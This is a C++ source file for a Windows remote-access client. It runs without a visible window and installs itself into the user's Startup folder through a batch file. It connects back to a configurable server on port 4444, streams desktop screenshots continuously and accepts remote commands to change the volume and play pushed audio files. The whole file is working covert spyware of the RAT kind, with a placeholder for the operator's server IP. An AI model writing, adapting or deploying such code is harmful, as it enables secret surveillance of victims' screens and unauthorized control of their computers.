// client.cpp
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <gdiplus.h>
#include <mmsystem.h>
#include <mmdeviceapi.h>
#include <endpointvolume.h>
#include <string>
#include <thread>
#include <fstream>
#include <vector>
#include <cstdio>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")

const char* SERVER_IP = "192.168.0.104"; // <<< CHANGE TO YOUR SERVER IP
const int PORT = 4444;

// ---------- volume control ----------
void SetVolume(int vol) {
    CoInitialize(0);
    IMMDeviceEnumerator* pEnum = 0;
    IMMDevice* pDev = 0;
    IAudioEndpointVolume* pVol = 0;
    if (SUCCEEDED(CoCreateInstance(__uuidof(MMDeviceEnumerator),0,CLSCTX_ALL,
                   __uuidof(IMMDeviceEnumerator),(void**)&pEnum)) &&
        SUCCEEDED(pEnum->GetDefaultAudioEndpoint(eRender, eConsole, &pDev)) &&
        SUCCEEDED(pDev->Activate(__uuidof(IAudioEndpointVolume),CLSCTX_ALL,0,(void**)&pVol))) {
        pVol->SetMasterVolumeLevelScalar(vol / 100.0f, 0);
        pVol->Release();
    }
    if(pDev) pDev->Release();
    if(pEnum) pEnum->Release();
    CoUninitialize();
}

int GetEncoderClsid(const WCHAR* mime, CLSID* clsid) {
    UINT num=0, size=0;
    Gdiplus::GetImageEncodersSize(&num, &size);
    if(!size) return -1;
    Gdiplus::ImageCodecInfo* p = (Gdiplus::ImageCodecInfo*)malloc(size);
    Gdiplus::GetImageEncoders(num, size, p);
    for(UINT i=0; i<num; i++) {
        if(wcscmp(p[i].MimeType, mime)==0) {
            *clsid = p[i].Clsid;
            free(p);
            return i;
        }
    }
    free(p);
    return -1;
}

bool SendAll(SOCKET s, const char* d, int len) {
    int total=0;
    while(total<len) {
        int n = send(s, d+total, len-total, 0);
        if(n<=0) return false;
        total += n;
    }
    return true;
}

bool RecvAll(SOCKET s, char* d, int len) {
    int total=0;
    while(total<len) {
        int n = recv(s, d+total, len-total, 0);
        if(n<=0) return false;
        total += n;
    }
    return true;
}

void CommandListener(SOCKET s) {
    while(true) {
        char cmd;
        if(recv(s, &cmd,1,0) != 1) break;
        if(cmd == 'V') {
            int vol;
            if(!RecvAll(s, (char*)&vol, 4)) break;
            SetVolume(vol);
        } else if(cmd == 'P') {
            int sz;
            if(!RecvAll(s, (char*)&sz, 4)) break;
            std::vector<char> buf(sz);
            if(!RecvAll(s, buf.data(), sz)) break;
            char tmp[MAX_PATH];
            GetTempPathA(MAX_PATH, tmp);
            std::string f = std::string(tmp) + "nyx_remote.mp3";
            std::ofstream out(f, std::ios::binary);
            out.write(buf.data(), sz);
            out.close();
            mciSendStringA(("open \"" + f + "\" type mpegvideo alias nyx").c_str(), 0,0,0);
            mciSendStringA("play nyx", 0,0,0);
        }
    }
}

int main() {
    char me[MAX_PATH];
    GetModuleFileNameA(0, me, MAX_PATH);
    std::string start = std::string(getenv("USERPROFILE")) +
        "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\nyxr.bat";
    std::ofstream bat(start);
    bat << "@echo off\nstart \"\" \"" << me << "\"\n";
    bat.close();

    while(true) {
        WSADATA wsa; WSAStartup(MAKEWORD(2,2), &wsa);
        SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
        sockaddr_in addr{};
        addr.sin_family = AF_INET;
        addr.sin_port = htons(PORT);
        inet_pton(AF_INET, SERVER_IP, &addr.sin_addr);
        if(connect(sock, (sockaddr*)&addr, sizeof(addr)) == 0) {
            std::thread cmd(CommandListener, sock);
            cmd.detach();

            Gdiplus::GdiplusStartupInput gdip;
            ULONG_PTR gdipTok;
            Gdiplus::GdiplusStartup(&gdipTok, &gdip, 0);
            CLSID jpegClsid;
            GetEncoderClsid(L"image/jpeg", &jpegClsid);

            while(true) {
                HWND hwnd = GetDesktopWindow();
                HDC hdc = GetDC(hwnd);
                RECT r; GetClientRect(hwnd, &r);
                int w = r.right, h = r.bottom;
                HDC mem = CreateCompatibleDC(hdc);
                HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
                SelectObject(mem, bmp);
                BitBlt(mem,0,0,w,h, hdc,0,0, SRCCOPY);
                Gdiplus::Bitmap gdibmp(bmp, NULL);
                DeleteObject(bmp); DeleteDC(mem);
                ReleaseDC(hwnd, hdc);

                IStream* strm = 0;
                CreateStreamOnHGlobal(0, TRUE, &strm);
                gdibmp.Save(strm, &jpegClsid, 0);
                STATSTG st; strm->Stat(&st, STATFLAG_NONAME);
                ULONG len = st.cbSize.LowPart;
                BYTE* data = new BYTE[len];
                LARGE_INTEGER li{};
                strm->Seek(li, STREAM_SEEK_SET, 0);
                ULONG rd; strm->Read(data, len, &rd);
                strm->Release();

                if(!SendAll(sock, (char*)&len, 4) || !SendAll(sock, (char*)data, len)) {
                    delete[] data;
                    break;
                }
                delete[] data;
                Sleep(180);
            }
            Gdiplus::GdiplusShutdown(gdipTok);
        }
        closesocket(sock);
        WSACleanup();
        Sleep(5000);
    }
    return 0;
}